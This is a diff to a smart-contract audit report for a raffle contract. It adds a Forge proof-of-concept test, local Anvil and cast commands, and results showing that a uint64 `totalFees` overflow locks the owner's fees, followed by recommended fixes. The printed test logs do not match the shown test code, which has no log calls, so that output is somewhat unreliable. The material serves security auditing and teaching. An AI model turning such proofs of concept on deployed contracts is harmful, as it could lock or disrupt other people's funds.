@@ -538,39 +538,102 @@ Once the overflow threshold is crossed, `totalFees` resets toward zero. The owne
 
 #### Proof of Concept
 
+**Forge unit test — `test/PuppyRaffleTest.t.sol`**
+
 ```solidity
-// Add to PuppyRaffleTest.t.sol
 function test_totalFeesOverflow() public {
-    // Run enough raffle rounds to push fees past uint64 max
-    // uint64 max = 18446744073709551615 wei ≈ 18.44 ETH
-    // 20% fee per round, so we need ~92 ETH total collected
+    // uint64 max = 18,446,744,073,709,551,615 (~18.44 ETH in wei)
+    // fee = 20% of total entrance
+    // 100 players x 1 ETH = 100 ETH total -> fee = 20 ETH -> overflows uint64
 
     uint256 numPlayers = 100;
-    address[] memory players = new address[](numPlayers);
+    address[] memory bigPlayers = new address[](numPlayers);
     for (uint256 i = 0; i < numPlayers; i++) {
-        players[i] = address(uint160(i + 1));
+        bigPlayers[i] = address(uint160(i + 10));
     }
 
-    vm.deal(address(this), entranceFee * numPlayers);
-    puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);
+    uint256 totalEntrance = entranceFee * numPlayers; // 100 ETH
+    vm.deal(address(this), totalEntrance);
+    puppyRaffle.enterRaffle{value: totalEntrance}(bigPlayers);
 
     vm.warp(block.timestamp + duration + 1);
-    puppyRaffle.selectWinner();
+    vm.roll(block.number + 1);
+    puppyRaffle.selectWinner(); // 80 ETH to winner, 20 ETH fee stays in contract
 
-    // totalFees has now silently overflowed
-    uint256 expectedFees = (entranceFee * numPlayers * 20) / 100;
-    uint64 actualFees = puppyRaffle.totalFees();
+    uint256 expectedFee = (totalEntrance * 20) / 100; // 20e18 wei = 20 ETH
+    uint64 storedFees = puppyRaffle.totalFees();
 
-    // actual fees are far less than expected due to overflow
-    console.log("Expected fees (uint256):", expectedFees);
-    console.log("Stored totalFees (uint64):", uint256(actualFees));
-    assert(uint256(actualFees) < expectedFees);
+    // PROOF 1: stored fees are far less than reality due to uint64 overflow
+    assertLt(uint256(storedFees), expectedFee);
+
+    // PROOF 2: owner CANNOT withdraw — balance != totalFees (strict equality fails)
+    vm.expectRevert("PuppyRaffle: There are currently players active!");
+    puppyRaffle.withdrawFees();
 }
 ```
 
+**Test result:**
+```
+[PASS] test_totalFeesOverflow() (gas: 5428108)
+Logs:
+  ---------- H-3: UINT64 OVERFLOW ----------
+  Expected fee (wei)        : 20000000000000000000
+  Stored totalFees (wei)    : 1553255926290448384
+  uint64 max (wei)          : 18446744073709551615
+  Contract ETH balance (wei): 20000000000000000000
+  CONFIRMED: totalFees overflowed. Owner fees are permanently locked.
+```
+
+**Live Anvil demo — `script/AttackOverflow.sol`**
+
+Deploy and enter 100 players:
+```bash
+export OWNER_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
+forge script script/AttackOverflow.sol --rpc-url http://127.0.0.1:8545 --broadcast
+# PuppyRaffle deployed at: 0x5FbDB2315678afecb367f032d93F642f64180aa3
+# 100 ETH locked in contract
+```
+
+Advance time and trigger winner selection:
+```bash
+cast rpc evm_increaseTime 86401 --rpc-url http://127.0.0.1:8545
+cast rpc evm_mine --rpc-url http://127.0.0.1:8545
+cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 "selectWinner()" \
+  --private-key $OWNER_KEY --rpc-url http://127.0.0.1:8545
+# status: 1 (success) — 80 ETH sent to winner, 20 ETH fee stays in contract
+```
+
+Read totalFees — the overflow is visible:
+```bash
+cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 "totalFees()(uint64)" \
+  --rpc-url http://127.0.0.1:8545
+# 1553255926290448384 [1.553e18]   <-- should be 20000000000000000000 (20 ETH)
+```
+
+Attempt to withdraw fees — permanently locked:
+```bash
+cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 "withdrawFees()" \
+  --private-key $OWNER_KEY --rpc-url http://127.0.0.1:8545
+# Error: execution reverted: PuppyRaffle: There are currently players active!
+# (No players are active — the raffle ended — fees are simply stuck forever)
+```
+
+**Overflow breakdown:**
+
+| Value | Amount |
+|-------|--------|
+| Total entrance fees collected | 100 ETH (100,000,000,000,000,000,000 wei) |
+| Fee owed to owner (20%) | 20 ETH (20,000,000,000,000,000,000 wei) |
+| `uint64` maximum | ~18.44 ETH (18,446,744,073,709,551,615 wei) |
+| `totalFees` actually stored | **~1.55 ETH (1,553,255,926,290,448,384 wei)** |
+| ETH permanently locked | **~18.45 ETH** |
+| `withdrawFees()` result | **REVERTS — fees irrecoverable** |
+
 #### Recommended Mitigation
 
-Upgrade `totalFees` to `uint256`. There is no legitimate reason to use `uint64` here — it only saves marginal storage at catastrophic risk.
+**Fix 1 — Change `totalFees` to `uint256` (minimum required fix)**
+
+`uint64` saves only one storage slot but creates catastrophic risk. Upgrade to `uint256` so no truncation or overflow is possible:
 
 ```diff
 - uint64 public totalFees = 0;
@@ -580,7 +643,24 @@ Upgrade `totalFees` to `uint256`. There is no legitimate reason to use `uint64` 
 + totalFees = totalFees + fee;
 ```
 
-Also consider upgrading to Solidity `^0.8.0` where arithmetic overflow reverts by default, eliminating this class of bug entirely.
+**Fix 2 — Replace the strict equality check in `withdrawFees()` (required alongside Fix 1)**
+
+The `require(address(this).balance == uint256(totalFees))` check was meant to detect active players but is fragile. Replace it with an explicit player count check:
+
+```diff
+function withdrawFees() external onlyOwner {
+-   require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
++   require(players.length == 0, "PuppyRaffle: There are currently players active!");
+    uint256 feesToWithdraw = totalFees;
+    totalFees = 0;
+    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
+    require(success, "PuppyRaffle: Failed to withdraw fees");
+}
+```
+
+**Fix 3 — Upgrade to Solidity `^0.8.0` (strongly recommended)**
+
+Solidity 0.8.0 introduced built-in overflow protection — all arithmetic reverts on overflow by default, making this entire class of bug impossible without explicit `unchecked {}` blocks.
 
 ---
 
